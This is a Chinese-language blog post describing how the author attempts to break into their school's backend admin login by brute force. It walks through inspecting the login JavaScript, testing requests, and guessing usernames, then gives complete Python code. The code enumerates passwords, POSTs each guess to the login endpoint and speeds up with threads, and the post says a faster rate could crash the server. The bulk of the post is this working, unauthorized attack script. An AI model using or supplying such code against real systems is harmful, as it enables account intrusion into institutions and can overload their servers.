---
title: 「危」暴力攻入学校的后台系统
createdAt: "2021-05-29"
category: 日常
heroImg: https://www.hualigs.cn/image/60b24cbc1d501.jpg
---

危险操作，请酌情采用，本文仅提供暴力破解的思路，从一个实例中学习。

本文不是专门针对学校，只是因为学校的服务器防御力比较高，在受到攻击的时候会很自觉地返回 **服务器压力过大**，即使从理论上来讲给埃拉两三年的时间可以破解进去，但是学校的响应速度也真的是感人，是个人都没有这种耐心（毕竟我没有那么多钱去应酬云服务器，而且浪费时间在这种无价值的地方也不是上策）


生成、创建进程、发送、等返回、关闭，一气呵成

## 侦察任务，勘探地形

如果你仔细发掘一下终端，你会发现几个重要的入口，埃拉这里是 `/theme/js/login.js` 的 Javascript 文件

![](https://www.hualigs.cn/image/60b25080753d8.jpg)

然后打开它来研究研究，你会发现存储用户名的变量竟然叫 `usrname`，密码是 `passwd`，并且序列化后就毫不犹豫地 POST 出去了，那么我们自己用 Postman 来试试看行不行

![](https://www.hualigs.cn/image/60b250ffbdabb.jpg)

然后装模做样地写好要传过去的数据（`学生会1` 这个用户名是埃拉通过小道消息得来的，通常你们可以试试看 admin 之类的）

![](https://www.hualigs.cn/image/60b2522570d02.jpg)

然后我们可以看到 `<p class="error">登录失败，密码错误.</p>` 这样的返回值（如果用户名不存在则会直接提示 `用户不存在`），现在我们就大概知道了几个重要的信息：

- 被攻击者的 URL
- 需要提供的数据
- 返回的数据

## 通过字典生成密码

```python
import itertools as its

def crack():
    words="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@." # 你觉得可能出现的字符，密码多为 ASCII 码字符
    count=0
    for num in range(6,20): # 指定密码位数，这里是从 6~20 位
        keys=its.product(words,repeat=num)
        for key in keys:
            print("".join(key)) # 此时 "".join(key) 即为生成的密码
            count += 1
```

## 发送数据，处理返回值

```python
import requests
from bs4 import BeautifulSoup

def inject(passwd): # 这里传入刚刚生成的密码
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36' }
    all_url = 'http://xxx.xxx.xx.xxx:30000/xxxxxx.php/base/login'  # 这里屏蔽一下 ipv4，免得学校找我麻烦
    start_html = requests.post(all_url,  headers=headers, json= {
        "usrname": "", # 问问你高二高三的学长，他们可能会告诉你用户名
        "passwd": passwd
    })
    soup = BeautifulSoup(start_html.text, 'lxml') # 使用 bs4 对返回的 html 进行解析
    try:
        if soup.select("p[class='error']")[0].getText() != "登录失败，密码错误.": # 剖析 html，提取出这个返回信息，如果不是这个返回信息，那就对了（因为用户名是已知的（对埃拉而言））
            print("[√ 成功破解] The PASSWD is '"+ passwd +"\n")
            with open('success.txt', 'w') as file:
                file.write("[√ 成功破解] The PASSWD is '"+ passwd +"\n") # 保存正确的密码
                file.close()
        else:
            print("[× 错误] "+passwd+"\n") # 输出错误的密码
    except:
        print("[× 异常] "+passwd+"\n") # 抛出异常
```

## 提升破解效率

如果我们只是使用刚刚的方法，那么每一次的破解都会在上一个破解完成后才进行，这样会 **很慢很慢**，所以我们可以使用多线程来克服这个问题，最终的代码如下

```python
"""
🍀 本代码理论上可行，但是需要充足的时间，起码三年吧，不取决于你的算力，而是他们的反应能力（恕我直言，我实在没见过这么垃圾的服务器）
【本代码在正常情况下禁止运行（除非迫不得已），否则后果自负！】
如果你要问我为什么搞这个，那么就问问考试院为什么要加 Python，以及，学校图书馆为什么教会了我爬虫和数据解析
"""
import requests
from bs4 import BeautifulSoup
import itertools as its
import _thread
import time

def inject(passwd,thread_name):
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.110 Safari/537.36' }
    all_url = 'http://xxx.xxx.xx.xxx:30000/xxxxxxx.php/base/login'
    start_html = requests.post(all_url,  headers=headers, json= {
        "usrname": "",
        "passwd": passwd
    })
    soup = BeautifulSoup(start_html.text, 'lxml')
    try:
        if soup.select("p[class='error']")[0].getText() != "登录失败，密码错误.":
            print("[√ 成功破解] The PASSWD is '"+ passwd + "'"+" 线程名："+thread_name+"\n")
            with open('success.txt', 'w') as file:
                file.write("[√ 成功破解] The PASSWD is '"+ passwd + "'"+" 线程名："+thread_name+"\n")
                file.close()
        else:
            print("[× 错误] "+passwd+" 线程名："+thread_name+"\n")
    except:
        print("[× 异常] "+passwd+" 线程名："+thread_name+"\n")
    _thread.exit() # 退出当前线程

def crack():
    words="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@."
    count=0
    for num in range(6,20):
        keys=its.product(words,repeat=num)
        for key in keys:
            _thread.start_new_thread( inject, ("".join(key), "Thread-"+str(count), ) )
            time.sleep(0.05) # 如果你调成更小的数值，你就等校领导找上门来吧，因为服务器会直接崩溃！
            count += 1

if __name__ == "__main__":
    crack()
```

请注意控制好线程创建速度！如果你设置得太小，就算你的计算机承受的住，人家的服务器可能承受不住~

OK，就这么多了，同样的代码我已经发布到 Github Gist 上，可以进行查阅！🍀后续可能会再出一些克服验证码的方案！